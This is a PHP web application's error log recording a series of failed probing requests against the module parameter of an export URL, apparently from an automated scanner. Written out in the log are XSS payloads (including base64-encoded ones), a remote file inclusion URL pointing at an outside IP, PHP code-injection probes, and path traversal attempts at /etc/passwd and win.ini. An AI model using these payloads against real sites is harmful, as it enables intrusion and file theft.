<?php
 die();
?>

04:34:24 ERROR: the control file module/bugi2027381i/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=bugi2027381i&f=export&productID=8&orderBy=title_asc

04:35:12 ERROR: the control file module/bugi2027381i/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=bugi2027381i&f=export&productID=8&orderBy=title_asc

04:35:36 ERROR: the control file module/bugi2027381i/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=bugi2027381i&f=export&productID=8&orderBy=title_asc

04:36:12 ERROR: the control file module/bugi2027381i/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=bugi2027381i&f=export&productID=8&orderBy=title_asc

04:36:53 ERROR: the control file module/'"/>alert()/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m='%22/%3E%3C/script%3E%3Cscript%3Ealert()%3C/script%3E&f=export&productID=8&orderBy=title_asc

04:40:40 ERROR: the control file module/'"/>alert()/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=%27%22%2f%3E%3C%2fscript%3E%3Cscript%3Ealert%28%29%3C%2fscript%3E&f=export&productID=8&orderBy=title_asc

04:41:47 ERROR: the control file module/%27%22%2f%3e%3c%2fscript%3e%3cscript%3ealert%28%29%3c%2fscript%3e/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=%2527%2522%252f%253E%253C%252fscript%253E%253Cscript%253Ealert%2528%2529%253C%252fscript%253E&f=export&productID=8&orderBy=title_asc

04:46:32 ERROR: the control file module/phnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg==/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&f=export&productID=8&orderBy=title_asc

04:56:27 ERROR: the control file module/bugi2027381i/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=bugi2027381i&f=export&productID=8&orderBy=title_asc

05:03:34 ERROR: the control file module/phnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg==/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&f=export&productID=8&orderBy=title_asc

05:03:48 ERROR: the control file module/amf2yxnjcmlwddpwcm9tchqomtexktt4/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=amF2YXNjcmlwdDpwcm9tcHQoMTExKTt4&f=export&productID=8&orderBy=title_asc

05:11:00 ERROR: the control file module/bug'">/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=bug'%22%3E%3Ciframe%20onload=alert()%3E&f=export&productID=8&orderBy=title_asc

05:21:43 ERROR: the control file module/phnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg==/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&f=export&productID=8&orderBy=title_asc

05:22:00 ERROR: the control file module/amf2yxnjcmlwddpwcm9tchqomtexktt4/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=amF2YXNjcmlwdDpwcm9tcHQoMTExKTt4&f=export&productID=8&orderBy=title_asc

05:25:03 ERROR: the control file module/bug'">/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=bug'%22%3E%3Ciframe%20onload=alert()%3E&f=export&productID=8&orderBy=title_asc

05:25:19 ERROR: the control file module/bug'">/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=bug'%22%3E%3Cimg%20src=x%20onerror=prompt()%3E&f=export&productID=8&orderBy=title_asc

05:25:45 ERROR: the control file module/bug'">/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=bug'%22%3E%3Csvg%20onload=prompt()%3E&f=export&productID=8&orderBy=title_asc

05:26:02 ERROR: the control file module/http://120.26.55.211/s.txt/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=http://120.26.55.211/s.txt&f=export&productID=8&orderBy=title_asc

05:26:13 ERROR: the control file module/http://120.26.55.211/s.txt/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=http%3A%2F%2F120.26.55.211%2Fs.txt&f=export&productID=8&orderBy=title_asc

05:26:19 ERROR: the control file module/a_long_name_file_not_exist/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=a_long_name_file_not_exist&f=export&productID=8&orderBy=title_asc

05:26:36 ERROR: the control file module/${@print(md5(this_is_a_test_string))}/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D&f=export&productID=8&orderBy=title_asc

05:26:45 ERROR: the control file module/${@print(md5(this_is_a_test_string))}\/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D%5C&f=export&productID=8&orderBy=title_asc

05:26:56 ERROR: the control file module/print(md5(this_is_a_test_string));die();/*/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=print%28md5%28this_is_a_test_string%29%29%3Bdie%28%29%3B%2F*&f=export&productID=8&orderBy=title_asc

05:27:10 ERROR: the control file module//etc/passwd/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=%2Fetc%2Fpasswd&f=export&productID=8&orderBy=title_asc

05:27:19 ERROR: the control file module/c://windows/win.ini/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=c%3A%2F%2Fwindows%2Fwin.ini&f=export&productID=8&orderBy=title_asc

05:27:34 ERROR: the control file module/../../../../../../../../etc/passwd/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&f=export&productID=8&orderBy=title_asc

05:27:47 ERROR: the control file module/../../../../../../../../windows/win.ini/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini&f=export&productID=8&orderBy=title_asc

05:28:06 ERROR: the control file module/../../../../../../../../../../etc/passwd%00/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500&f=export&productID=8&orderBy=title_asc

05:28:17 ERROR: the control file module/../../../../../../../../../../windows/win.ini00/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini00&f=export&productID=8&orderBy=title_asc

05:28:29 is_file() expects parameter 1 to be a valid path, string given in framework/router.class.php on line 990 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg&f=export&productID=8&orderBy=title_asc

05:28:29 ERROR: the control file module/../../../../../../../../etc/passwd in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg&f=export&productID=8&orderBy=title_asc

05:28:39 is_file() expects parameter 1 to be a valid path, string given in framework/router.class.php on line 990 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00.jpg&f=export&productID=8&orderBy=title_asc

05:28:39 ERROR: the control file module/../../../../../../../../windows/win.ini in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00.jpg&f=export&productID=8&orderBy=title_asc

05:28:54 ERROR: the control file module/../../../../../../../../etc/passwd
.jpg/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%0a.jpg&f=export&productID=8&orderBy=title_asc

05:29:12 ERROR: the control file module/../../../../../../../../windows/win.ini
.jpg/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%0a.jpg&f=export&productID=8&orderBy=title_asc
